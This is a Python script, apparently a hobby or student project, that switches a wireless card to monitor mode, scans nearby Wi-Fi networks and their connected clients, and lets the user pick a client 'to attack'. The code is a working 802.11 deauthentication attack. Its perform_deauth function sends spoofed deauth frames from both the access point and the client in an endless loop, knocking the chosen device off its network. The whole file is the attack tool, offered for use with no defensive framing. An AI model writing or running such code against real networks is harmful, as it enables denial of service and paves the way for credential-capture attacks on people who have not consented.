import sys

import netifaces
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp, Dot11Elt, Dot11Deauth, RadioTap

network_list = {}


class Network:
    def __init__(self, bssid, mac, chanel):
        self.bssid = bssid
        self.mac = mac
        self.chanel = chanel
        self.users = []

    def net_info(self):
        return f"{self.bssid} {self.mac}"

    def get_users(self):
        return self.users

    def add_user(self, user_mac):
        self.users.append(user_mac)

    def display_users(self):
        print("users in this network:")
        for user in range(0, len(self.users)):
            print(f"{user + 1} {self.users[user]}\n")

    def get_mac(self):
        return self.mac


# need to pip install netiface!!!!!
def iface_list():
    if_list = netifaces.interfaces()
    return if_list


def monitorMode(iface):
    os.system("ifconfig " + iface + " down")
    os.system("iwconfig " + iface + " mode monitor")
    os.system("ifconfig " + iface + " up")


def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        dot11_layer = pkt[Dot11]
        if dot11_layer.addr2 and (dot11_layer.addr2 not in network_list.keys()):
            bssid = pkt[Dot11].info
            channel = int(ord(pkt[Dot11Elt:3].info))
            mac = dot11_layer.addr2
            # print(f"bssid:{bssid}, mac:{mac}, channel:{channel}")
            new_network = Network(bssid, pkt[Dot11].addr2, channel)
            new_duo = {mac: new_network}
            network_list.update(new_duo)
    # elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == '2L' and not pkt.haslayer(EAPOL):
    else:

        sn = pkt.getlayer(Dot11).addr2
        rc = pkt.getlayer(Dot11).addr1
        # print(sn)
        # print(rc)
        if sn in network_list.keys():
            net = network_list.get(sn)
            if rc not in net.get_users():
                net.add_user(rc)
        if rc in network_list.keys():
            net = network_list.get(rc)
            if sn not in net.get_users():
                net.add_user(sn)


def start_sniffer(interface):
    os.system("clear")
    for channel in range(1, 13):
        os.system("iwconfig %s channel %d" % (interface, channel))
        sniff(iface=interface, timeout=2, prn=packet_handler)


def perform_deauth(router, client, iface):
    pckt = RadioTap()/Dot11(addr1=client, addr2=router, addr3=router) / Dot11Deauth()
    cli_to_ap_pckt = RadioTap()/Dot11(addr1=router, addr2=client, addr3=client) / Dot11Deauth()

    print('Sending Deauth to ' + client + ' from ' + router)

    count = 1
    while count != 0:
        try:
            for i in range(200):
                # Send out deauth from the AP
                #send(pckt)
                sendp(pckt, inter=0.1, count=None, loop=1, iface=iface, verbose=1)
                # If we're targeting a client, we will also spoof deauth from the client to the AP
                #send(cli_to_ap_pckt)
                sendp(cli_to_ap_pckt, inter=0.1, count=None, loop=1, iface=iface, verbose=1)
            # If count was -1, this will be an infinite loop
            count -= 1
        except Exception as e:
            print(f"error: {e}")
            break


if __name__ == '__main__':
    # display all available interface
    print("available interfaces:")
    if_list = iface_list()
    for i in range(1, len(if_list)):
        print(i, if_list[i])

    # let user pick interface - check number is valid & check interface can be in monitor mode
    user_choice = input("please pick an interface\n ")
    user_iface = if_list[int(user_choice)]

    print('moving interface to monitor mode')
    monitorMode(user_iface)

    # checking and displaying available networks - per 13 chanels
    print("sniffing for available networks for 60 seconds...")
    start_sniffer(user_iface)
    for net in range(0, len(network_list)):
        obj = list(network_list)[net]
        net_inf = network_list.get(obj).net_info()
        print(f"{net + 1} {net_inf}")

    # let user pick network - check number is valid
    print(len(network_list))
    user_choice = input("please pick a network: ")
    user_key = list(network_list)[int(user_choice) - 1]
    user_network = network_list.get(user_key)
    os.system("iwconfig %s channel %d" % (user_iface, user_network.chanel))

    # sniff and display all users in network
    user_network.display_users()
    user_choice = input("please pick a client to attack: ")
    client_to_attack = user_network.get_users()[int(user_choice)-1]
    print(f"will be attacking {client_to_attack}")
    perform_deauth(user_network.get_mac(), client_to_attack, user_iface)
    # let attacker pick user - check number is valid'''

    # deauth
